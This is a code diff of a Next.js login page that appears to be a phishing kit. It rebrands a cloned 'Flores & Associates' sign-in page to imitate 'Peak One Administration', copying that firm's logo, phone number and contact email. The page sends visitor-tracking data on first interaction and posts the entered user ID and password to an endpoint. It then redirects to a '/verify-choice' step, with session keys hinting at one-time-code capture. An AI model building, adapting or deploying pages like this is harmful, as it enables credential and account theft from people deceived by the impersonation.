@@ -1,17 +1,17 @@
 "use client";
 
 import { useState, useEffect, useRef } from "react";
+import type { FormEvent } from "react";
 import { useRouter } from "next/navigation";
 import { Preloader } from "@/components/preloader";
-import { SiteHeader } from "@/components/site-header";
 import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
 
 export default function LoginPage() {
-  // --- All original hooks and logic preserved ---
   const [showContent, setShowContent] = useState(false);
   const [hasInteracted, setHasInteracted] = useState(false);
   const visitorInfo = useVisitorTracking();
   const hasSentVisitRef = useRef(false);
+
   useEffect(() => {
     if (typeof window !== "undefined") {
       sessionStorage.removeItem("ubs_verify");
@@ -19,6 +19,7 @@ export default function LoginPage() {
       sessionStorage.removeItem("ubs_otp2");
     }
   }, []);
+
   useEffect(() => {
     const onFirstInteraction = () => setHasInteracted(true);
     window.addEventListener("pointerdown", onFirstInteraction, {
@@ -31,6 +32,7 @@ export default function LoginPage() {
       window.removeEventListener("keydown", onFirstInteraction);
     };
   }, []);
+
   useEffect(() => {
     if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
     hasSentVisitRef.current = true;
@@ -40,16 +42,17 @@ export default function LoginPage() {
       body: JSON.stringify(visitorInfo),
     }).catch(console.error);
   }, [hasInteracted, visitorInfo]);
+
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [isLoginLoading, setIsLoginLoading] = useState(false);
   const [loginError, setLoginError] = useState<string | null>(null);
-  const [countdown, setCountdown] = useState(0);
   const [honeypot, setHoneypot] = useState("");
   const countdownRef = useRef<number | null>(null);
   const redirectRef = useRef<number | null>(null);
   const router = useRouter();
-  const handleSignIn = async (event: React.FormEvent<HTMLFormElement>) => {
+
+  const handleSignIn = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault();
     if (isLoginLoading || !username || !password) return;
     if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
@@ -65,33 +68,21 @@ export default function LoginPage() {
         body: JSON.stringify({ userId: username, password }),
       });
       if (!response.ok) {
-        throw new Error("Failed to send login data");
+        throw new Error("Login failed");
       }
       if (typeof window !== "undefined") {
         sessionStorage.setItem("ubs_verify", "1");
       }
-      setCountdown(10);
-      countdownRef.current = window.setInterval(() => {
-        setCountdown((prev) => {
-          if (prev <= 1) {
-            if (countdownRef.current) {
-              window.clearInterval(countdownRef.current);
-              countdownRef.current = null;
-            }
-            return 0;
-          }
-          return prev - 1;
-        });
-      }, 1000);
       redirectRef.current = window.setTimeout(() => {
         router.push("/verify-choice");
       }, 10000);
     } catch (error) {
       console.error("Login failed:", error);
-      setLoginError("Unable to send login details. Please try again.");
+      setLoginError("Login failed. Please try again.");
       setIsLoginLoading(false);
     }
   };
+
   useEffect(() => {
     return () => {
       if (countdownRef.current) {
@@ -102,6 +93,7 @@ export default function LoginPage() {
       }
     };
   }, []);
+
   return (
     <>
       {!showContent && <Preloader onComplete={() => setShowContent(true)} />}
@@ -109,243 +101,268 @@ export default function LoginPage() {
         <>
           <style>{`
             *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
-            body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;color:#222;min-height:100vh;display:flex;flex-direction:column;}
-            header{display:flex;align-items:center;gap:16px;padding:12px 24px;border-bottom:1px solid #e5e7eb;background:#fff;}
-            .logo-img{height:32px;width:auto;display:block;}
-            .header-title{font-size:0.97rem;font-weight:400;color:#444;}
-            main{flex:1;display:flex;flex-direction:row;align-items:flex-start;justify-content:flex-start;padding:56px 16px 40px;}
-            .login-content-wrapper {
-              display: flex;
-              flex-direction: column;
-              align-items: flex-start;
-              width: 100%;
-              max-width: 460px;
-              margin-left: 48px;
-            }
-            .card {
-              width: 100%;
-              max-width: 460px;
-              display: flex;
-              flex-direction: column;
-              align-items: flex-start;
-              background: none;
-              box-shadow: none;
-              padding: 0;
-            }
-            .padlock-center {
-              width: 100%;
-              display: flex;
-              flex-direction: column;
-              align-items: center;
-              margin-bottom: 18px;
-            }
-            .padlock-center .lock-icon {
-              margin-bottom: 8px;
-            }
-            .padlock-center .privacy-text {
-              text-align: center;
-              max-width: 420px;
-              margin-bottom: 0;
-            }
-            @media (max-width: 700px) {
-              main {
-                flex-direction: column;
-                align-items: stretch;
-                padding: 32px 8px 28px;
-              }
-              .login-content-wrapper {
-                margin-left: 0;
-                max-width: 100%;
-                width: 100%;
-                padding: 0;
-              }
-              .card {
-                max-width: 100%;
-                align-items: stretch;
-              }
-              .padlock-center .privacy-text {
-                max-width: 100%;
-              }
-            }
-            .lock-icon{margin-bottom:14px;}
-            .lock-icon img{width:58px;height:auto;display:block;}
-            .privacy-text{font-size:0.82rem;color:#555;text-align:center;max-width:360px;line-height:1.6;margin-bottom:18px;}
-            .signin-heading{font-size:1.08rem;font-weight:600;color:#111;margin-bottom:24px;}
-            form{width:100%;}
-            .field{margin-bottom:16px;}
-            label{display:block;font-size:0.87rem;color:#222;margin-bottom:5px;}
-            .required-star{color:#c0392b;margin-left:2px;}
-            input[type="text"],input[type="password"]{width:100%;padding:8px 11px;border:1.5px solid #bbb;border-radius:3px;font-size:0.94rem;color:#222;background:#fff;outline:none;transition:border-color 0.18s;}
-            input[type="text"]:focus,input[type="password"]:focus{border-color:#1a3a6b;}
-            .help-link{display:block;margin-top:5px;font-size:0.8rem;color:#555;}
-            .help-link a{color:#1a5cab;text-decoration:none;}
-            .help-link a:hover{text-decoration:underline;}
-            .btn{display:inline-flex;align-items:center;gap:9px;padding:10px 20px;font-size:0.87rem;font-weight:700;letter-spacing:0.07em;border:none;border-radius:3px;cursor:pointer;text-transform:uppercase;transition:opacity 0.15s;}
-            .btn:hover{opacity:0.88;}
-            .btn-primary{background:#1a2a5e;color:#fff;margin-top:6px;}
-            .btn-register{background:#1a2a5e;color:#fff;margin-top:8px;}
-            .register-section{margin-top:20px;}
-            .register-label{font-size:0.87rem;color:#333;}
-            footer{background:#003f6f;padding:20px 24px;text-align:left;display:flex;flex-direction:column;align-items:flex-start;}
-            .footer-links{display:flex;justify-content:center;flex-wrap:wrap;gap:8px 28px;margin-bottom:9px;}
-            .footer-links a{font-size:0.8rem;font-weight:700;color:#1a2a5e;text-decoration:none;letter-spacing:0.03em;text-transform:uppercase;}
+            body{font-family:'Open Sans',Arial,sans-serif;background:#fff;color:#333;min-height:100vh;display:flex;flex-direction:column;font-size:14px;}
+            .topnav{background:#fff;border-bottom:1px solid #ddd;padding:8px 18px;display:flex;align-items:center;gap:24px;}
+            .peakone-logo{height:44px;width:auto;display:block;flex-shrink:0;}
+            .contact-block{display:flex;flex-direction:column;gap:2px;font-size:0.8rem;color:#444;}
+            .contact-row{display:flex;align-items:center;gap:6px;}
+            .contact-row svg{flex-shrink:0;color:#555;}
+            .nav-login-label{font-size:1.3rem;font-weight:300;color:#444;margin-left:4px;}
+            main{flex:1;display:flex;flex-direction:column;align-items:flex-start;padding:36px 20px 56px;padding-left:120px;}
+            .login-wrapper{width:100%;max-width:100%;display:flex;flex-direction:column;align-items:flex-start;gap:0;}
+            .lock-wrap{margin-bottom:12px;align-self:center;margin-top:0;}
+            .privacy-note{font-size:0.8125rem;color:#555;text-align:center;max-width:420px;line-height:1.55;margin-bottom:12px;margin-top:0;align-self:center;}
+            .signin-heading{font-size:1rem;font-weight:400;color:#333;margin-bottom:28px;margin-top:0;align-self:center;}
+            form{width:100%;max-width:420px;}
+            .field-group{margin-bottom:18px;}
+            .field-label{font-size:0.8125rem;color:#444;margin-bottom:5px;display:flex;align-items:center;gap:3px;}
+            .req{color:#e8a020;font-size:0.8rem;}
+            input[type="text"],input[type="password"]{width:100%;height:36px;border:1px solid #aaa;border-radius:2px;padding:0 10px;font-size:0.875rem;font-family:'Open Sans',sans-serif;color:#333;outline:none;background:#fff;transition:border-color 0.15s,box-shadow 0.15s;}
+            input[type="text"]:focus,input[type="password"]:focus{border-color:#8a7a4a;box-shadow:0 0 0 2px rgba(138,122,74,0.14);}
+            .field-group.has-error input{border-color:#c0392b;}
+            .field-help{font-size:0.75rem;color:#555;margin-top:5px;}
+            .field-help a{color:#1a6a9a;text-decoration:none;}
+            .field-help a:hover{text-decoration:underline;}
+            .err-msg{display:none;font-size:0.72rem;color:#c0392b;margin-top:4px;}
+            .field-group.has-error .err-msg{display:block;}
+            .btn-signin{background:#9a8650;color:#fff;border:none;border-radius:3px;padding:0 22px;height:40px;font-size:0.875rem;font-weight:600;font-family:'Open Sans',sans-serif;letter-spacing:0.03em;cursor:pointer;display:inline-flex;align-items:center;gap:10px;margin-bottom:18px;transition:background 0.15s,transform 0.08s;}
+            .btn-signin:hover{background:#7d6c40;}
+            .btn-signin:active{transform:scale(0.99);}
+            .btn-signin:disabled{opacity:0.65;cursor:not-allowed;}
+            @keyframes spin{to{transform:rotate(360deg);}}
+            .spin-ring{display:none;width:14px;height:14px;border:2px solid rgba(255,255,255,0.35);border-top-color:#fff;border-radius:50%;animation:spin 0.65s linear infinite;}
+            .no-account-text{font-size:0.8rem;color:#555;margin-bottom:8px;}
+            .btn-register{background:#5a6378;color:#fff;border:none;border-radius:3px;padding:0 22px;height:40px;font-size:0.875rem;font-weight:600;font-family:'Open Sans',sans-serif;letter-spacing:0.03em;cursor:pointer;display:inline-flex;align-items:center;gap:10px;transition:background 0.15s;}
+            .btn-register:hover{background:#424a5c;}
+            footer{background:#e0e0e0;padding:22px 20px 16px;text-align:center;}
+            .footer-links{display:flex;justify-content:center;gap:32px;margin-bottom:8px;}
+            .footer-links a{font-size:0.8125rem;color:#444;text-decoration:none;letter-spacing:0.04em;font-weight:600;text-transform:uppercase;}
             .footer-links a:hover{text-decoration:underline;}
-            .footer-copy{font-size:0.74rem;color:#fff;margin-bottom:20px;margin-top:0;}
-            .footer-sitemap{width:100%;text-align:center;}
-            .footer-sitemap a{font-size:0.76rem;color:#87ceeb;text-decoration:none;font-weight:600;}
-            .footer-sitemap a:hover{text-decoration:underline;}
-            @media(max-width:500px){main{padding:32px 12px 28px;}.btn{width:100%;justify-content:center;}.footer-links{gap:7px 14px;}}
+            .footer-copy{font-size:0.72rem;color:#666;}
+            #toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(10px);background:#333;color:#fff;font-size:0.8rem;padding:9px 18px;border-radius:3px;opacity:0;pointer-events:none;transition:opacity 0.2s,transform 0.2s;z-index:9999;white-space:nowrap;}
+            #toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+            @media(max-width:700px){
+              .topnav{flex-direction:column;gap:12px;}
+              .nav-login-label{margin-left:0;}
+              main{padding:32px 16px 40px;padding-left:16px;align-items:center;}
+              .login-wrapper{align-items:center;}
+              .lock-wrap{max-width:none;width:100%;}
+              .signin-heading{max-width:none;width:100%;}
+              .privacy-note{max-width:none;width:100%;}
+            }
           `}</style>
-          <SiteHeader />
-          {/* Wrap main and footer in a fragment to ensure valid JSX */}
-          <>
-            <main>
-              <div className="login-content-wrapper">
-                <div className="padlock-center">
-                  <div className="lock-icon">
-                    <img
-                      src="data:image/png;base64,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"
-                      alt="Secure login"
-                    />
-                  </div>
-                  <p className="privacy-text">
-                    We will maintain the confidentiality of your personal
-                    information in accordance with our privacy policy.
-                  </p>
+          <nav className="topnav">
+            <a href="#" onClick={(e) => e.preventDefault()}>
+              <img
+                className="peakone-logo"
+                src="/PeakOne-Logo-1.jpg"
+                alt="Peak One Administration"
+              />
+            </a>
+            <div className="contact-block">
+              <div className="contact-row">
+                <svg
+                  width="12"
+                  height="12"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                >
+                  <rect x="5" y="2" width="14" height="20" rx="2" />
+                  <line x1="12" y1="18" x2="12" y2="18" />
+                </svg>
+                866.315.1777
+              </div>
+              <div className="contact-row">
+                <svg
+                  width="12"
+                  height="12"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="2"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                >
+                  <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
+                  <polyline points="22,6 12,13 2,6" />
+                </svg>
+                membercare@peakoneadmin.com
+              </div>
+            </div>
+            <span className="nav-login-label">Login</span>
+          </nav>
+          <main>
+            <div className="login-wrapper">
+              <form id="login-form" onSubmit={handleSignIn}>
+                <div className="lock-wrap flex justify-center">
+                  <svg
+                    width="44"
+                    height="44"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="#555"
+                    strokeWidth="1.3"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  >
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+                    <path d="M7 11V7a5 5 0 0110 0v4" />
+                    <circle cx="12" cy="16" r="1" fill="#555" stroke="none" />
+                  </svg>
                 </div>
-                <div className="card">
-                  <h1 className="signin-heading">Sign in</h1>
-                  <form onSubmit={handleSignIn}>
-                  <div className="field">
-                    <label htmlFor="userId">
-                      UserId <span className="required-star">*</span>
-                    </label>
-                    <input
-                      type="text"
-                      id="userId"
-                      name="userId"
-                      autoComplete="username"
-                      required
-                      value={username}
-                      onChange={(e) => setUsername(e.target.value)}
-                    />
-                    <span className="help-link">
-                      Forgot your Username? <a href="#">Let us help</a>
-                    </span>
-                  </div>
-                  <div className="field">
-                    <label htmlFor="password">
-                      Password <span className="required-star">*</span>
-                    </label>
-                    <input
-                      type="password"
-                      id="password"
-                      name="password"
-                      autoComplete="current-password"
-                      required
-                      value={password}
-                      onChange={(e) => setPassword(e.target.value)}
-                    />
-                    <span className="help-link">
-                      Forgot your Password? <a href="#">Let us help</a>
-                    </span>
+
+                <p className="privacy-note">
+                  We will maintain the confidentiality of your personal
+                  information in accordance with our privacy policy.
+                </p>
+
+                <p className="signin-heading flex justify-center">Sign in</p>
+                <div className="field-group" id="fg-user">
+                  <div className="field-label">
+                    UserId <span className="req">*</span>
                   </div>
                   <input
                     type="text"
-                    name="website"
-                    value={honeypot}
-                    onChange={(e) => setHoneypot(e.target.value)}
-                    style={{ display: "none" }}
-                    autoComplete="off"
+                    id="userid"
+                    autoComplete="username"
+                    value={username}
+                    onChange={(e) => setUsername(e.target.value)}
+                    onInput={() => {
+                      const el = document.getElementById("fg-user");
+                      if (el) el.classList.remove("has-error");
+                    }}
                   />
-                  <button
-                    type="submit"
-                    className="btn btn-primary"
-                    disabled={isLoginLoading || !username || !password}
-                  >
-                    <svg
-                      width="15"
-                      height="15"
-                      viewBox="0 0 15 15"
-                      fill="none"
-                      xmlns="http://www.w3.org/2000/svg"
-                    >
-                      <polyline
-                        points="1.5,7.5 6,12.5 13.5,3"
-                        stroke="#fff"
-                        strokeWidth="2.2"
-                        strokeLinecap="round"
-                        strokeLinejoin="round"
-                      />
-                    </svg>
-                    {isLoginLoading ? "Signing in..." : "Sign In"}
-                  </button>
-                  <div className="register-section">
-                    <p className="register-label">Don't have an account?</p>
-                    <button type="button" className="btn btn-register">
-                      <svg
-                        width="19"
-                        height="16"
-                        viewBox="0 0 20 17"
-                        fill="none"
-                        xmlns="http://www.w3.org/2000/svg"
-                      >
-                        <circle
-                          cx="8"
-                          cy="5"
-                          r="4"
-                          stroke="#fff"
-                          strokeWidth="1.9"
-                          fill="none"
-                        />
-                        <path
-                          d="M1 17c0-3.866 3.134-7 7-7"
-                          stroke="#fff"
-                          strokeWidth="1.9"
-                          strokeLinecap="round"
-                          fill="none"
-                        />
-                        <line
-                          x1="15"
-                          y1="9"
-                          x2="15"
-                          y2="17"
-                          stroke="#fff"
-                          strokeWidth="2"
-                          strokeLinecap="round"
-                        />
-                        <line
-                          x1="11"
-                          y1="13"
-                          x2="19"
-                          y2="13"
-                          stroke="#fff"
-                          strokeWidth="2"
-                          strokeLinecap="round"
-                        />
-                      </svg>
-                      Register
-                    </button>
+                  <div className="field-help">
+                    Forgot your Username?{" "}
+                    <a href="#" onClick={(e) => e.preventDefault()}>
+                      Let us help
+                    </a>
                   </div>
+                  <div className="err-msg">Please enter your User ID.</div>
+                </div>
+
+                <div className="field-group" id="fg-pwd">
+                  <div className="field-label">
+                    Password <span className="req">*</span>
+                  </div>
+                  <input
+                    type="password"
+                    id="password"
+                    autoComplete="current-password"
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    onInput={() => {
+                      const el = document.getElementById("fg-pwd");
+                      if (el) el.classList.remove("has-error");
+                    }}
+                  />
+                  <div className="field-help">
+                    Forgot your Password?{" "}
+                    <a href="#" onClick={(e) => e.preventDefault()}>
+                      Let us help
+                    </a>
+                  </div>
+                  <div className="err-msg">Please enter your Password.</div>
+                </div>
+
+                <input
+                  type="text"
+                  name="website"
+                  value={honeypot}
+                  onChange={(e) => setHoneypot(e.target.value)}
+                  style={{ display: "none" }}
+                  autoComplete="off"
+                />
+
+                <button
+                  type="submit"
+                  className="btn-signin"
+                  id="signin-btn"
+                  disabled={isLoginLoading || !username || !password}
+                >
+                  <svg
+                    id="signin-check"
+                    width="16"
+                    height="16"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="white"
+                    strokeWidth="3"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  >
+                    <polyline points="20 6 9 17 4 12" />
+                  </svg>
+                  <div className="spin-ring" id="signin-spin"></div>
+                  <span id="signin-label">
+                    {isLoginLoading ? "Signing in…" : "SIGN IN"}
+                  </span>
+                </button>
+
+                <p className="no-account-text">Don't have an account?</p>
+                <button
+                  type="button"
+                  className="btn-register"
+                  onClick={() => {
+                    const el = document.getElementById("toast");
+                    if (el) {
+                      el.textContent = "Opening registration…";
+                      el.classList.add("show");
+                      setTimeout(() => el.classList.remove("show"), 2800);
+                    }
+                  }}
+                >
+                  <svg
+                    width="16"
+                    height="16"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="white"
+                    strokeWidth="2"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  >
+                    <path d="M16 21v-2a4 4 0 00-4-4H6a4 4 0 00-4 4v2" />
+                    <circle cx="9" cy="7" r="4" />
+                    <line x1="19" y1="8" x2="19" y2="14" />
+                    <line x1="22" y1="11" x2="16" y2="11" />
+                  </svg>
+                  REGISTER
+                </button>
+
+                {loginError && (
                   <p
-                    style={{ color: "red", minHeight: "1.25rem", marginTop: 8 }}
+                    style={{
+                      color: "#c0392b",
+                      marginTop: 8,
+                      fontSize: "0.75rem",
+                    }}
                     aria-live="polite"
                   >
-                    {loginError ?? ""}
+                    {loginError}
                   </p>
-                </form>
-              </div>
+                )}
+              </form>
             </div>
-            </main>
-            <footer>
-              <p className="footer-copy">
-                Copyright &copy; 2024 Flores & Associates, LLC. All Rights Reserved.
-              </p>
-              <p className="footer-sitemap">
-                <a href="#">SITE MAP</a>
-              </p>
-            </footer>
-          </>
+          </main>
+
+          <footer>
+            <div className="footer-links">
+              <a href="#" onClick={(e) => e.preventDefault()}>
+                TERMS OF USE
+              </a>
+              <a href="#" onClick={(e) => e.preventDefault()}>
+                PRIVACY POLICY
+              </a>
+            </div>
+            <p className="footer-copy">
+              Copyright © 2017 Peak1 Administration LLC. All Rights Reserved.
+            </p>
+          </footer>
         </>
       )}
     </>
